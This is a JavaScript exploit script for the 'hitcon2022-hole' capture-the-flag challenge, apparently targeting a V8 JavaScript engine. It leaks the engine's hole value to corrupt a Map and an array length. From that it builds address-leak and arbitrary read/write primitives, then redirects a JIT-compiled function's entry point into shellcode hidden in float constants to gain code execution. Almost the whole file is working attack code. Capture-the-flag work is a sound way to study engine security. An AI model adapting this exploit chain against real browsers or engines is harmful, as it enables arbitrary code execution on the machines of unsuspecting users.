// exploit for hitcon2022-hole

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.state = {};
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    itof(i) {
        this.u32[0] = i;
        return this.f32[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    clean() {
        this.state.fake_object.fill(0);
    }

    printhex(val) {
        console.log('0x' + val.toString(16));
    }

    add_ref(object) {
        this.state[this.i++] = object;
    }

    gc() {
        for (let i = 0; i < 0x20000; i++) {
            new Array(0x10);
            new Array(0x10);
            new Array(0x10);
            new Array(0x10);
        }
    }

    compact() {
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
    }
}

var helper = new Helpers();

// prepare JITed function to trigger exploition
const foo = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	foo();foo();foo();foo();
}

// helper.compact();
// helper.gc();

// overwrite a map's size
let hole = [].hole();
var map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
console.log(map.size);

// control an array's length
var corrupted_array = new Array(1.1, 1.1);
var evil_float_array = [4.3];
var evil_object_array = [{}];
map.set(0x10, -1);
// gc();
map.set(corrupted_array, 0xffff);
console.log(corrupted_array.length);

for (let i = 0; i < 0x50; i++) {
    console.log(i);
    // console.log(corrupted_array[i]);
    helper.printhex(helper.f64toi64(corrupted_array[i]));
    console.log("\n");
}

float_properties = helper.ftoih(corrupted_array[7]);
float_map = helper.ftoil(corrupted_array[7]);
float_elemaddr = helper.ftoil(corrupted_array[8]);
float_length = helper.ftoih(corrupted_array[8]);
object_properties = helper.ftoil(corrupted_array[14]);
object_map = helper.ftoih(corrupted_array[13]);
object_elemaddr = helper.ftoih(corrupted_array[14]);
object_length = helper.ftoil(corrupted_array[15]);

function get_addr( obj ) {
    let bakup1 = helper.ftoil(corrupted_array[13]);
    evil_object_array[0] = obj;
    corrupted_array[13] = helper.i64tof64( (BigInt(float_map) << 32n) + BigInt(bakup1) );
    let res = helper.ftoil(evil_object_array[0]);
    corrupted_array[13] = helper.i64tof64( (BigInt(object_map) << 32n) + BigInt(bakup1) );
    return res;
}
function arb_write_16( addr, data ) {
    corrupted_array[8] = helper.i64tof64( (BigInt(float_length) << 0x20n) + BigInt(addr) - 0x8n );
    evil_float_array[0] = data;
}
function arb_read_16( addr ) {
    corrupted_array[8] = helper.i64tof64( (BigInt(float_length) << 0x20n) + BigInt(addr) - 0x8n);
    return helper.f64toi64(evil_float_array[0]);
}

let foo_addr  = get_addr(foo);
let code_addr = arb_read_16(foo_addr + 0x18) & 0xffffffffn;
let entry_add = arb_read_16(code_addr + 0xcn);

arb_write_16(code_addr+0xcn, helper.i64tof64(entry_add+0x73n));

helper.printhex(foo_addr);
helper.printhex(code_addr);
helper.printhex(entry_add);

// %DebugPrint(foo);
// %DebugPrint(corrupted_array);
// %DebugPrint(evil_float_array);
// %DebugPrint(evil_object_array);
// %SystemBreak();

foo();
